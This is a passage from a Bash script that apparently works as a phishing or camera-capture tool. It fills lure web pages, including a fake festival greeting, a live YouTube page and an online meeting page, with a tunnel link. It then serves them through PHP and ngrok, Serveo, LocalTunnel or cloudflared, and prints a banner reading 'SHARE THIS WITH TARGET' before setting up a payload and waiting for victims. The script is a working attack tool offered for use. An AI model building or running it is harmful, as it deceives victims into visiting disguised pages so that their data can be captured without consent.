			if ! sed -e "s|fes_name|$fest_esc|g" index3.html > index2.html 2>/dev/null; then
				printf "\e[1;31m[!] Error: sed failed to process fes_name\e[0m\n"
				return 1
			fi
			printf "\e[1;92m[✓] Festival page created\e[0m\n"
			;;
		2)
			# Live YouTube TV: replace forwarding_link and live_yt_tv
			printf "\e[1;92m[+] Using: Live YouTube TV (video ID: %s)\e[0m\n" "$yt_video_ID"
			if ! sed -e "s|forwarding_link|$link_esc|g" LiveYTTV.html > index3.html 2>/dev/null; then
				printf "\e[1;31m[!] Error: sed failed to process forwarding_link\e[0m\n"
				return 1
			fi
			if ! sed -e "s|live_yt_tv|$vid_esc|g" index3.html > index2.html 2>/dev/null; then
				printf "\e[1;31m[!] Error: sed failed to process live_yt_tv\e[0m\n"
				return 1
			fi
			printf "\e[1;92m[✓] YouTube page created\e[0m\n"
			;;
		3)
			# Online Meeting: replace forwarding_link and post_url_placeholder
			printf "\e[1;92m[+] Using: Online Meeting\e[0m\n"
			if ! sed -e "s|forwarding_link|$link_esc|g" OnlineMeeting.html > index2.html 2>/dev/null; then
				printf "\e[1;31m[!] Error: sed failed to process forwarding_link in OnlineMeeting.html\e[0m\n"
				# Fallback: copy as-is if forwarding_link not found
				cp OnlineMeeting.html index2.html
			fi
			# Replace post_url_placeholder with actual server URL
			if ! sed -i "s|post_url_placeholder|$link_esc|g" index2.html 2>/dev/null; then
				printf "\e[1;31m[!] Error: sed failed to process post_url_placeholder\e[0m\n"
			fi
			printf "\e[1;92m[✓] Online Meeting page created\e[0m\n"
			;;
		*)
			printf "\e[1;31m[!] ERROR: Invalid template option: %d\e[0m\n" "$option_tem"
			return 1
			;;
	esac
	
	rm -f index3.html
	printf "\e[1;92m[✓] Page generation complete (index2.html ready)\e[0m\n"
}

# ============================================================================
# MAIN: Auto-detect and run
# ============================================================================
main() {
	banner
	dependencies

	# Check if running in WSL and warn
	if is_wsl; then
		printf "\e[1;93m╔════════════════════════════════════════════════════════════╗\e[0m\n"
		printf "\e[1;93m║\e[0m\e[1;31m              WARNING: Running in WSL2                        \e[0m\e[1;93m║\e[0m\n"
		printf "\e[1;93m║\e[0m                                                            \e[1;93m║\e[0m\n"
		printf "\e[1;93m║\e[0m  WSL networking may cause ngrok to fail. For best results:\e[0m\e[1;93m║\e[0m\n"
		printf "\e[1;93m║\e[0m  - Use Git Bash (Windows native)\e[0m                            \e[1;93m║\e[0m\n"
		printf "\e[1;93m║\e[0m  - Use Termux for Windows\e[0m                               \e[1;93m║\e[0m\n"
		printf "\e[1;93m║\e[0m  - Or use Termux on Android for guaranteed success\e[0m       \e[1;93m║\e[0m\n"
		printf "\e[1;93m║\e[0m                                                            \e[1;93m║\e[0m\n"
		printf "\e[1;93m║\e[0m  Trying anyway... (Serveo will be fallback)\e[0m            \e[1;93m║\e[0m\n"
		printf "\e[1;93m╚════════════════════════════════════════════════════════════╝\e[0m\n"
		printf "\n"
		sleep 3
	fi

	# Auto-install missing dependencies automatically unless NO_AUTO_INSTALL is set
	if [[ -z "$NO_AUTO_INSTALL" ]]; then
		auto_install_dependencies auto || true
	else
		printf "\e[1;93m[!] Skipping automatic dependency installation (NO_AUTO_INSTALL set)\e[0m\n"
	fi

	printf "\n\e[1;92m[*] Auto-setup mode\e[0m\n"

	# Kill any existing services
	printf "\e[1;92m[+] Cleaning up old processes...\e[0m\n"
	kill_port 3333
	kill_port 4040
	pkill -f -2 ngrok > /dev/null 2>&1 || true
	pkill -f -2 php > /dev/null 2>&1 || true
	sleep 1

	# Setup ngrok (auto-download)
	if ! setup_ngrok; then
		printf "\e[1;93m[!] ngrok setup failed, will try Serveo only\e[0m\n"
	else
		if ! setup_ngrok_auth; then
			printf "\e[1;93m[!] ngrok auth failed, will try Serveo\e[0m\n"
		fi
	fi

	# Select template
	select_template

	# Setup PHP server with binding for hotspots
	PHP_BIND="127.0.0.1"
	if $IS_TERMUX || $IS_WINDOWS; then
		PHP_BIND="0.0.0.0"
	fi

	printf "\e[1;92m[+] Starting PHP server on $PHP_BIND:3333\e[0m\n"
	
	# Start PHP server and capture output
	php -S ${PHP_BIND}:3333 > php.log 2>&1 < /dev/null &
	local php_pid=$!
	printf "\e[1;92m[+] PHP PID: $php_pid\e[0m\n"
	
	# Quick verify PHP started
	if ! kill -0 $php_pid 2>/dev/null; then
		printf "\e[1;31m[!] PHP failed to start\e[0m\n"
		printf "\e[1;93m[DEBUG] php.log:\e[0m\n"
		cat php.log || true
		return 1
	fi
	
	printf "\e[1;92m[✓] PHP server running\e[0m\n"
	# Quick network check before trying tunnels
	printf "\n\e[1;92m[*] Network diagnostics...\e[0m\n"
	
	# Check if PHP is actually listening (retry multiple addresses)
	printf "\e[1;92m[+] Checking PHP on $PHP_BIND:3333...\e[0m\n"
	local php_ok=0
	for host in 127.0.0.1 0.0.0.0; do
		for try in 1 2 3; do
			if curl -s --max-time 1 "http://$host:3333/index.php" >/dev/null 2>&1; then
				printf "\e[1;92m[✓] PHP is responding on $host:3333\e[0m\n"
				php_ok=1
				break 2
			fi
			printf "."
			sleep 1
		done
	done

	if [[ $php_ok -ne 1 ]]; then
		printf "\n\e[1;31m[!] ERROR: PHP not responding on local interfaces\e[0m\n"
		printf "\e[1;93m[DEBUG] php.log:\e[0m\n"
		tail -40 php.log || true
		printf "\e[1;93m[!] Attempting to restart PHP bound to 0.0.0.0 and retry...\e[0m\n"
		pkill -f "php -S" 2>/dev/null || true
		php -S 0.0.0.0:3333 > php.log 2>&1 < /dev/null &
		sleep 1
		for try in 1 2 3; do
			if curl -s --max-time 1 "http://0.0.0.0:3333/index.php" >/dev/null 2>&1; then
				printf "\e[1;92m[✓] PHP is responding after restart on 0.0.0.0:3333\e[0m\n"
				php_ok=1
				break
			fi
			printf "."
			sleep 1
		done
		if [[ $php_ok -ne 1 ]]; then
			printf "\n\e[1;31m[!] ERROR: PHP still not responding\e[0m\n"
			tail -40 php.log || true
			return 1
		fi
	fi
	
	# Check internet connectivity
	printf "\e[1;92m[+] Checking internet...\e[0m\n"
	if curl -s --max-time 3 https://google.com >/dev/null 2>&1; then
		printf "\e[1;92m[✓] Internet OK\e[0m\n"
	else
		printf "\e[1;93m[!] WARNING: No internet or slow connection\e[0m\n"
		printf "\e[1;93m    Ngrok/Serveo may fail\e[0m\n"
	fi
	# Try tunneling methods with user selection + fallback
	printf "\n\e[1;92m[*] Obtaining public link...\e[0m\n"
	local link=""

	# Prompt user for preferred tunnel method
	printf "\n\e[1;93m-----Choose tunnel preference-----\e[0m\n"
	printf "  [1] ngrok (recommended if you have valid token)\n"
	printf "  [2] LocalTunnel (requires npx/npm)\n"
	printf "  [3] Cloudflared (requires cloudflared binary)\n"
	printf "  [4] Serveo (ssh-based, works on most systems)\n"
	printf "  [5] Auto (try all, best one first) [default]\n"
	printf "\e[1;92m[?] Enter choice [5]: \e[0m"
	read tunnel_choice
	tunnel_choice="${tunnel_choice:-5}"

	# Build try order based on choice
	local -a tunnels=()
	case "$tunnel_choice" in
		1) tunnels=(ngrok serveo) ;; 
		2) tunnels=(localtunnel serveo ngrok) ;; 
		3) tunnels=(cloudflared serveo ngrok) ;; 
		4) tunnels=(serveo ngrok) ;; 
		*) 
			# Auto mode: prefer Serveo in WSL, ngrok otherwise
			if is_wsl; then
				tunnels=(serveo ngrok localtunnel cloudflared)
				printf "\e[1;93m[!] WSL detected - trying Serveo first\e[0m\n"
			else
				tunnels=(ngrok serveo localtunnel cloudflared)
			fi
			;;
	esac

	# Try each tunnel in sequence until one returns a link
	printf "\e[1;92m[+] Attempting tunnels: %s\e[0m\n" "${tunnels[*]}"
	local link_rc=0
	for t in "${tunnels[@]}"; do
		case "$t" in
			ngrok)
				printf "\e[1;92m[+] Trying ngrok...\e[0m\n"
				link=$(try_ngrok 2>&1) || link=""
				;;
			localtunnel)
				printf "\e[1;92m[+] Trying LocalTunnel...\e[0m\n"
				link=$(try_localtunnel 2>&1) || link=""
				;;
			cloudflared)
				printf "\e[1;92m[+] Trying cloudflared...\e[0m\n"
				link=$(try_cloudflared 2>&1) || link=""
				;;
			serveo)
				printf "\e[1;92m[+] Trying Serveo...\e[0m\n"
				link=$(try_serveo 2>&1) || link=""
				;;
		esac

		if [[ -n "$link" ]]; then
			printf "\e[1;92m[✓] SUCCESS with %s!\e[0m\n" "$t"
			link_rc=0
			break
		fi
	done

	if [[ -z "$link" ]]; then
		printf "\e[1;31m[!] All tunneling methods failed\e[0m\n"
		printf "\e[1;93m[!] Possible reasons:\e[0m\n"
		printf "  - No internet connection\n"
		printf "  - Firewall blocking tunnels\n"
		printf "  - ngrok authtoken invalid or account blocked\n"
		printf "  - Serveo service temporarily down\n"
		stop
	fi

	printf "\e[1;92m[+] Link obtained successfully!\e[0m\n\n"
	printf "\e[1;92m╔════════════════════════════════════════════════════════════╗\e[0m\n"
	printf "\e[1;92m║\e[0m\e[1;77m          PUBLIC LINK - SHARE THIS WITH TARGET          \e[0m\e[1;92m║\e[0m\n"
	printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
	printf "\e[1;92m║\e[0m  \e[1;93m%s\e[0m\n" "$link"
	printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
	printf "\e[1;92m╚════════════════════════════════════════════════════════════╝\e[0m\n\n"

	# Setup payload
	payload "$link"

	# Wait for targets
	checkfound
}

# ============================================================================
# Run (only when executed, not when sourced)
# ============================================================================
if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
	main "$@"
fi
